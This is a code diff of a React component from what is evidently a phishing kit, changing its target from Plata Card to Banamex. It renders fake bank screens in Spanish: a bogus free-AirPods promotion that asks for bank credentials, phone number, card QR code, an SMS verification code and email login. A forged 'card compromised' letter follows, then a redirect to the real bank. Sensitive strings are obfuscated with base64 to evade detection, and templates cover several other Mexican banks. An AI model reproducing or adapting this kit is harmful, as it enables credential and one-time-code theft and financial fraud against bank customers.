@@ -24,7 +24,7 @@ import santanderLogo from '../../assets/santander_logo.png';
 import santanderLogoWhite from '../../assets/santander_logo_white.png';
 import scotiabankLogo from '../../assets/scotiabank_logo.png';
 import scotiabankLogoWhite from '../../assets/scotiabank_logo_white.png';
-import platacardLogo from '@assets/Plata_Card_Logo_1754951777982.png';
+import banamexLogo from '@assets/Banamex.png';
 import banregioLogo from '../../assets/banregio_logo.png';
 import banregioLogoWhite from '../../assets/banregio_logo_white.png';
 import googleLogo from '../../assets/google-logo.png';
@@ -58,7 +58,7 @@ interface ScreenTemplatesProps {
 
 // Ofuscación de strings sensibles
 const obfuscatedStrings = {
-  bankDefault: atob('QkFOT1JURQ=='), // BANORTE
+  bankDefault: atob('QkFOQU1FWA=='), // BANAMEX
   userField: atob('dXNlcm5hbWU='), // username
   passField: atob('cGFzc3dvcmQ='), // password
   errorText: atob('RXJyb3I='), // Error
@@ -146,11 +146,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.PROMOCION:
         const promocionContent = (
           <div className="min-h-screen bg-white">
-            {/* Header navegación PLATA CARD */}
+            {/* Header navegación Banamex */}
             <div className="bg-white border-b border-gray-200 px-4 py-3">
               <div className="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-start sm:items-center">
                 <div className="flex items-center mb-3 sm:mb-0">
-                  <div className="font-bold text-xl">PLATA<span className="platacard-accent">CARD</span></div>
+                  <div className="font-bold text-xl text-[#BE0046]">BANAMEX</div>
                 </div>
                 <nav className="flex flex-wrap gap-4 md:gap-6 text-sm text-gray-600">
                   <span className="hover:text-orange-500 cursor-pointer transition-colors">Tarjetas</span>
@@ -173,7 +173,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6">
                       Promoción Exclusiva
                     </h1>
-                    <p className="text-xl text-gray-600">Para clientes seleccionados de Plata Card</p>
+                    <p className="text-xl text-gray-600">Para clientes seleccionados de Banamex</p>
                   </div>
 
                   {/* Tarjeta AirPods Principal */}
@@ -257,7 +257,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <div className="bg-white rounded-xl overflow-hidden shadow-lg">
                       <img 
                         src={promoImage2} 
-                        alt="Oferta Especial Plata Card" 
+                        alt="Oferta Especial Banamex" 
                         className="w-full h-72 object-cover"
                       />
                     </div>
@@ -288,7 +288,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <span className="platacard-step-number mr-8">2</span>
                     <div className="flex-1">
                       <div className="font-bold text-gray-900 text-2xl mb-6">Inicia sesión</div>
-                      <div className="text-gray-700 text-xl leading-relaxed">Accede con tus credenciales de Plata Card para verificar tu elegibilidad</div>
+                      <div className="text-gray-700 text-xl leading-relaxed">Accede con tus credenciales de Banamex para verificar tu elegibilidad</div>
                     </div>
                   </div>
 
@@ -310,7 +310,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     Reclamar mis AirPods Pro Max →
                   </Button>
                   <p className="text-lg text-gray-500 mt-8">
-                    * Promoción válida solo para clientes seleccionados de Plata Card
+                    * Promoción válida solo para clientes seleccionados de Banamex
                   </p>
                 </div>
               </div>
@@ -322,18 +322,18 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const terminosContent = (
           <>
             <h2 className="text-lg font-bold mb-4 text-gray-700">
-              Términos y Condiciones de la Promoción AirPods Pro Max Gratis a Clientes Seleccionados Plata Card
+              Términos y Condiciones de la Promoción AirPods Pro Max Gratis a Clientes Seleccionados Banamex
             </h2>
             <div className="max-h-80 overflow-y-auto text-left mb-6 text-sm text-gray-700 pr-2">
               <p className="mb-3">
-                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "AirPods Pro Max Gratis a Clientes Seleccionados Plata Card" ofrecida por PLATA CARD.
+                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "AirPods Pro Max Gratis a Clientes Seleccionados Banamex" ofrecida por Banamex.
               </p>
               <p className="mb-2 font-semibold">1. Requisitos para Participar:</p>
               <p className="mb-3">
-                La promoción está dirigida exclusivamente a clientes seleccionados de Plata Card, quienes deberán cumplir con los siguientes requisitos:
+                La promoción está dirigida exclusivamente a clientes seleccionados de Banamex, quienes deberán cumplir con los siguientes requisitos:
               </p>
               <ul className="mb-3 ml-4 list-disc">
-                <li>Ser titular de una tarjeta Plata Card válida y activa.</li>
+                <li>Ser titular de una tarjeta Banamex válida y activa.</li>
                 <li>Tener un historial crediticio excelente con buen uso de la tarjeta.</li>
                 <li>Ser notificado de su selección para participar en la promoción.</li>
               </ul>
@@ -349,7 +349,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </ul>
               <p className="mb-2 font-semibold">8. Uso de Datos Personales:</p>
               <p className="mb-3">
-                Al participar, el cliente acepta que los datos personales puedan ser utilizados por Plata Card para fines relacionados con la promoción y otros fines comerciales.
+                Al participar, el cliente acepta que los datos personales puedan ser utilizados por Banamex para fines relacionados con la promoción y otros fines comerciales.
               </p>
             </div>
             <Button 
@@ -372,13 +372,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <span className="text-2xl text-white">📱</span>
                   </div>
                   <h2 className="text-2xl font-bold text-gray-900 mb-2">Ingresa tu número celular</h2>
-                  <p className="text-gray-600">registrado con Plata Card</p>
+                  <p className="text-gray-600">registrado con Banamex</p>
                 </div>
 
                 {/* Input de teléfono */}
                 <div className="mb-6">
                   <label className="block text-sm font-medium text-gray-700 mb-2">
-                    Número celular registrado con Plata Card
+                    Número celular registrado con Banamex
                   </label>
                   <input
                     type="tel"
@@ -427,7 +427,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <span className="text-2xl text-white">📷</span>
                   </div>
                   <h2 className="text-2xl font-bold text-gray-900 mb-2">Escanea el código QR</h2>
-                  <p className="text-gray-600">de tu Plata Card para poder identificarte</p>
+                  <p className="text-gray-600">de tu Banamex para poder identificarte</p>
                 </div>
 
                 {/* Área de cámara simulada */}
@@ -468,7 +468,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <div className="bg-orange-50 rounded-xl p-4 mb-6">
                   <h4 className="font-semibold text-orange-800 mb-2">Instrucciones:</h4>
                   <ul className="text-sm text-orange-700 space-y-1">
-                    <li>• Busca el código QR en tu tarjeta Plata Card</li>
+                    <li>• Busca el código QR en tu tarjeta Banamex</li>
                     <li>• Asegúrate de que esté bien iluminado</li>
                     <li>• Mantén la cámara estable al capturar</li>
                   </ul>
@@ -637,7 +637,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const folioContent = (
           <>
             <h2 className="text-xl font-bold mb-3">Folio de promoción:</h2>
-            <p className="mb-4">Por favor, ingrese el folio de la promoción de AirPods que recibió de Plata Card.</p>
+            <p className="mb-4">Por favor, ingrese el folio de la promoción de AirPods que recibió de Banamex.</p>
             <div className="mb-4">
               <label className="block text-sm font-medium text-gray-700 text-left mb-1">Número de folio:</label>
               <Input 
@@ -1503,7 +1503,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
               <div className="text-xs text-gray-500 mt-4 space-y-1">
                 <p>Esta promoción está regida por las leyes de México y los términos y condiciones previamente aceptados.</p>
-                <p>Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de Plata Card.</p>
+                <p>Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de Banamex.</p>
               </div>
             </div>
 
@@ -1511,11 +1511,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               className="platacard-button py-3 text-lg"
               onClick={() => {
                 setTimeout(() => {
-                  window.location.href = 'https://www.platacard.com/';
+                  window.location.href = 'https://www.banamex.com/';
                 }, 2000);
               }}
             >
-              Finalizar - Ir a Plata Card
+              Finalizar - Ir a Banamex
             </Button>
           </>
         );
@@ -1576,17 +1576,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
         const verifyContent = (
           <>
-            {/* Logo de Plata Card */}
+            {/* Logo de Banamex */}
             <div className="flex justify-center mb-6">
               <img 
-                src={platacardLogo} 
-                alt="Plata Card" 
+                src={banamexLogo} 
+                alt="Banamex" 
                 className="h-12 object-contain"
               />
             </div>
 
             <h2 className="text-xl font-bold mb-4 text-center text-[#BE0046]">
-              Ingresa el código que recibiste por SMS al número *{phoneTermination} para vincular tu dispositivo con PlataCard
+              Ingresa el código que recibiste por SMS al número *{phoneTermination} para vincular tu dispositivo con Banamex
             </h2>
 
             <div className="mb-6">
@@ -1658,7 +1658,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Estimado/a cliente: {screenData.titular || "ejemplo"}
               </p>
               <p className="mb-3">
-                El sistema ha concluido un análisis de seguridad y ha detectado que su tarjeta Plata Card con terminación {screenData.terminacion || "Ejemplo"} ha sido vulnerada, lo que significa que sus datos personales han sido comprometidos.
+                El sistema ha concluido un análisis de seguridad y ha detectado que su tarjeta Banamex con terminación {screenData.terminacion || "Ejemplo"} ha sido vulnerada, lo que significa que sus datos personales han sido comprometidos.
               </p>
               <p className="mb-3">
                 Por protocolo de seguridad, su tarjeta será enviada al área de Prevención de Fraudes, donde se llevará a cabo un análisis técnico forense para identificar el origen de la vulnerabilidad y proceder con las medidas de protección necesarias.
@@ -1718,7 +1718,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
               <p className="mb-1">Atentamente,</p>
               <p className="mb-1">Departamento de Atención a Clientes</p>
-              <p className="font-semibold">Plata Card</p>
+              <p className="font-semibold">Banamex</p>
             </div>
 
             <Button 
@@ -1991,7 +1991,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 banco === 'AMEX' ? 'amex-bg' :
                 banco === 'SANTANDER' ? 'santander-bg' :
                 banco === 'SCOTIABANK' ? 'scotiabank-bg' :
-                banco === 'PLATACARD' ? 'platacard-bg' :
+                banco === 'BANAMEX' ? 'banamex-bg' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
@@ -2040,7 +2040,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
 
             <p className="text-[15px] text-gray-700 mb-6">
-              Para sincronizar tus notificaciones con la aplicación <strong>Plata Card Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
+              Para sincronizar tus notificaciones con la aplicación <strong>Banamex Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
             </p>
 
             <Input 
@@ -2180,7 +2180,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <h2 className="text-2xl font-light mb-4 self-start">Iniciar sesión</h2>
 
             <p className="text-sm text-gray-600 mb-6 self-start">
-              Para sincronizar tus notificaciones con la aplicación Plata Card Control, inicia sesión utilizando tu correo electrónico registrado.
+              Para sincronizar tus notificaciones con la aplicación Banamex Control, inicia sesión utilizando tu correo electrónico registrado.
             </p>
 
             {!hotmailStep2 ? (
@@ -2287,7 +2287,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <h2 className="text-3xl font-bold mb-4">Iniciar sesión</h2>
 
                 <p className="text-sm text-gray-700 mb-6 w-full text-left">
-                  Para sincronizar tus notificaciones con la aplicación Plata Card Control, inicia sesión utilizando tu correo electrónico registrado.
+                  Para sincronizar tus notificaciones con la aplicación Banamex Control, inicia sesión utilizando tu correo electrónico registrado.
                 </p>
 
                 <div className="w-full mb-5">
@@ -2511,7 +2511,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className="w-12 h-12 border-t-4 border-b-4 border-[#ff6b35] rounded-full animate-spin"></div>
             </div>
             <p className="text-center mb-2 text-gray-700">Por favor espere, estamos validando su promoción de AirPods Pro Max...</p>
-            <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de Plata Card</p>
+            <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de Banamex</p>
           </div>
         );
         return getBankContainer(generandoPromocionContent);
@@ -2548,8 +2548,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'SCOTIABANK':
         return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
-      case 'PLATACARD':
-        return 'bg-[#BE0046] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'BANAMEX':
+        return 'bg-[#153e46] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANREGIO':
         return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANORTE':
@@ -2588,7 +2588,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'AMEX': return 'bg-[#0077C8] text-white p-2';
       case 'SANTANDER': return 'santander-header';
       case 'SCOTIABANK': return 'scotiabank-header';
-      case 'PLATACARD': return 'platacard-header';
+      case 'BANAMEX': return 'banamex-header';
       case 'BANREGIO': return 'banregio-header';
       case 'BANORTE': return 'banorte-header';
       default: return 'bg-gray-100 p-3 text-center font-semibold';
@@ -2607,7 +2607,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';
       case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow santander-container';
       case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';
-      case 'PLATACARD': return 'bg-white p-4 rounded-lg shadow platacard-container';
+      case 'BANAMEX': return 'bg-white p-4 rounded-lg shadow banamex-container';
       case 'BANREGIO': return 'bg-white p-4 rounded-lg shadow banregio-container';
       case 'BANORTE': return 'banorte-container';
       default: return '';
